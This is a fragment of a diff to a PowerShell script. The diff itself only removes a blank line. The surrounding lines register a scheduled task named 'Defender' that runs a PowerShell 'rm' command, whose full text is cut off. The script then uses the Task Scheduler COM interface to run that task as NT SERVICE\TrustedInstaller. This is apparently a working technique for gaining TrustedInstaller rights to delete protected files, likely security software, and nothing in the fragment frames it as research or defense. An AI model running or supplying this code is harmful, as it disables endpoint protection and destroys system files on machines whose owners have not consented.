@@ -2,5 +2,4 @@ Register-ScheduledTask Defender -Ac (New-ScheduledTaskAction powershell "-C rm -
 
 $svc = New-Object -ComObject 'Schedule.Service'
 $svc.Connect()
-
 $svc.GetFolder('\').GetTask('Defender').RunEx("", 0, 0, 'NT SERVICE\TrustedInstaller')
